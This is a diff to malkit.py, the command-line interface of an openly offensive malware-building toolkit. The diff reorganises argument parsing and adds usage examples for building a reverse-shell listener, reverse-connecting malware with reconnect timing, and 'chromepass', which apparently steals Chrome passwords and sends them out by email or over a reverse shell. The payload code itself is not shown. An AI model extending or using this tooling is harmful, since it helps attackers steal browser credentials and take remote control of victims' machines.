@@ -1,12 +1,14 @@
-import configparser
 import argparse
-import sys
+import configparser
 import os
+import sys
 import time
-
-from progress.spinner import Spinner
+from builtins import KeyboardInterrupt
 from subprocess import call
+
 from darkarp.malkit_modules import build
+from progress.spinner import Spinner
+
 # from testing import build
 
 # #? LOAD SETTINGS #
@@ -14,6 +16,7 @@ from darkarp.malkit_modules import build
 CONFIG_FILE = "malkit.conf"
 CONFIG = configparser.ConfigParser()
 CONFIG.read(CONFIG_FILE)
+__VERSION = CONFIG["DEFAULT"]["VersionLong"]
 
 
 def check_folders():
@@ -45,8 +48,11 @@ def build_listener(args):
         while True:
             start = input("Would you like to start the listener? [y/n]> ")
             if start.lower() == "y" or start.lower() == 'yes':
-                call(["python", "listeners/listener.py"])
-                break
+                try:
+                    call(["python", "listeners/listener.py"])
+                except KeyboardInterrupt:
+                    os._exit(0)
+
             elif start.lower() == 'n' or start.lower() == "no":
                 break
 
@@ -211,54 +217,60 @@ A copy paste will work, adding after rest is working")
 
 def getOptions():
     parser = argparse.ArgumentParser()
-    subparsers = parser.add_subparsers()
+    subparsers = parser.add_subparsers(
+        title="Module-specific commands")
+
+    # Versioning
+    parser.add_argument("-v", "--version", action="version",
+                        version=__VERSION)
 
     # Build listener
     listener_example = '''example:
-
- python malkit.py build_listener -p 4444'''
+ python malkit.py build_listener -p 4444
+ python malkit.py build_listener -p 4444 --max_connections 10
+ 
+ '''
 
     parser_build_listener = subparsers.add_parser(
         'build_listener',
         epilog=listener_example,
-        formatter_class=argparse.RawDescriptionHelpFormatter)
-    parser_build_listener.add_argument(
-        "-p",
-        type=int,
-        metavar=f"Port for reverse connection",
-        required=True)
-    parser_build_listener.add_argument(
-        "--no_interact",
-        default=False,
-        action='store_true',
-        required=False)
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        help="-h for help",
+    )
+    parser_build_listener_required = parser_build_listener.add_argument_group(
+        'Required named arguments')
     parser_build_listener.add_argument(
         "--max_connections",
         type=str,
         metavar=f"Max number of possible connections",
         required=False
     )
+    parser_build_listener.add_argument(
+        "--no_interact",
+        default=False,
+        action='store_true',
+        required=False)
+    parser_build_listener_required.add_argument(
+        "-p",
+        type=int,
+        metavar=f"Port for reverse connection",
+        required=True)
     parser_build_listener.set_defaults(func=build_listener)
 
     # Build malware
     malware_example = '''example:
 
- python malkit.py build_malware --host 127.0.0.1 -p 4444'''
+ python malkit.py build_malware --host 127.0.0.1 -p 4444
+ python malkit.py build_malware --host 127.0.0.1 -p 4444 --reconnect_min 5 --reconnect_max 60
+ 
+ '''
 
     parser_build_malware = subparsers.add_parser(
         'build_malware',
         epilog=malware_example,
-        formatter_class=argparse.RawDescriptionHelpFormatter)
-    parser_build_malware.add_argument(
-        "--host",
-        type=str,
-        metavar=f"IP for reverse connection",
-        required=True)
-    parser_build_malware.add_argument(
-        "-p",
-        type=int,
-        metavar=f"Port for reverse connection.",
-        required=True)
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        help="-h for help")
+
     parser_build_malware.add_argument(
         "--reconnect_min",
         type=str,
@@ -272,6 +284,20 @@ def getOptions():
         required=False
     )
 
+    parser_build_malware_required = parser_build_malware.add_argument_group(
+        'Required named arguments')
+
+    parser_build_malware_required.add_argument(
+        "--host",
+        type=str,
+        metavar=f"IP for reverse connection",
+        required=True)
+    parser_build_malware_required.add_argument(
+        "-p",
+        type=int,
+        metavar=f"Port for reverse connection.",
+        required=True)
+
     parser_build_malware.set_defaults(func=build_malware)
 
     # Build chromepass
@@ -279,12 +305,15 @@ def getOptions():
 
  python malkit.py build_chromepass --email --address test@email.com
  python malkit.py build_chromepass --reverse_shell --host 127.0.0.1 -p 4444
- python malkit.py build_chromepass --load myfile.conf'''
+ python malkit.py build_chromepass --load myfile.conf
+ 
+ '''
 
     parser_build_chromepass = subparsers.add_parser(
         'build_chromepass',
         epilog=chromepass_example,
-        formatter_class=argparse.RawDescriptionHelpFormatter)
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        help="-h for help")
     parser_build_chromepass.add_argument(
         "--load",
         default=False,
